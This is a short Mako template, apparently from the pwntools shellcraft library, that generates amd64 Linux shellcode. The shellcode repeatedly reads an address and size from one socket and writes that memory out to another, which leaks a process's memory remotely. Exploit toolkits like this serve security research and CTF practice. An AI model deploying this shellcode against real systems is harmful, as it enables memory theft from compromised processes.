<% from pwnlib.shellcraft import amd64 %>
<% from pwnlib.shellcraft import common %>
<%page args="readsock=0, writesock=1"/>
<%docstring>
Reads from a buffer of a size and location determined at runtime.
When the shellcode is executing, it should send a pointer and
pointer-width size to determine the location and size of buffer.
</%docstring>
<%
after     = common.label("after")
before    = common.label("before")
%>

${before}:
    /* Read address / size tuples from fd ${readsock}, and
       then write the data to fd ${writesock} */
    ${amd64.linux.readptr(readsock, 'rsi')}
    push rsi
    ${amd64.linux.readptr(readsock, 'rdx')}
    pop rsi
    test rdx, rdx
    jz ${after}
    ${amd64.linux.syscall('SYS_write', writesock, 'rsi', 'rdx')}
    jmp ${before}
${after}: